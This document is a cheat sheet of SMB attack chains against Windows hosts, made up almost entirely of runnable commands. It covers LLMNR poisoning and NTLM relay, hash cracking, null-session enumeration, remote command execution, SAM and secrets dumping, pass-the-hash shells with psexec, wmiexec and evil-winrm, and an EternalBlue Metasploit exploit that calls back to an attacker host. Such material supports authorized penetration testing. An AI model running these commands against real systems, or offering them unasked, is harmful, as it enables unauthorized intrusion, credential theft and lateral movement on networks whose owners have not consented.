# SMB Attack Chains

## SMB Signing Disabled â†’ Relay Attack
```bash
# 1. Start Responder (poison LLMNR/NBT-NS)
responder -I eth0 -dwP

# 2. Start ntlmrelayx targeting the Windows host
ntlmrelayx.py -tf targets.txt -smb2support

# 3. If hash captured, crack it
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## SMB Null Session Enumeration
```bash
# Try null session
crackmapexec smb TARGET -u '' -p ''
smbclient -L //TARGET -N
rpcclient -U '' -N TARGET -c 'enumdomusers'
enum4linux-ng -A TARGET

# Guest session
crackmapexec smb TARGET -u 'guest' -p ''
smbmap -H TARGET -u guest
```

## SMB with Credentials
```bash
# Enumerate shares
smbmap -H TARGET -u USER -p PASS
smbclient -L //TARGET -U 'USER%PASS'

# Access shares
smbclient //TARGET/C$ -U 'USER%PASS'
smbclient //TARGET/ADMIN$ -U 'USER%PASS'
smbclient //TARGET/IPC$ -U 'USER%PASS'

# Execute commands
crackmapexec smb TARGET -u USER -p PASS -x "whoami /all"
crackmapexec smb TARGET -u USER -p PASS -x "ipconfig /all"

# Dump SAM
crackmapexec smb TARGET -u USER -p PASS --sam
impacket-secretsdump USER:PASS@TARGET
```

## Pass-the-Hash
```bash
# If you have NTLM hash instead of password
crackmapexec smb TARGET -u Administrator -H NTHASH
impacket-psexec -hashes :NTHASH Administrator@TARGET
impacket-wmiexec -hashes :NTHASH Administrator@TARGET
evil-winrm -i TARGET -u Administrator -H NTHASH
```

## EternalBlue (MS17-010)
```bash
# Check
nmap -p445 --script smb-vuln-ms17-010 TARGET

# Exploit with Metasploit
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS TARGET; set LHOST KALI_IP; exploit"

# Manual with impacket
python3 /opt/ms17-010/checker.py TARGET
python3 /opt/ms17-010/zzz_exploit.py TARGET
```
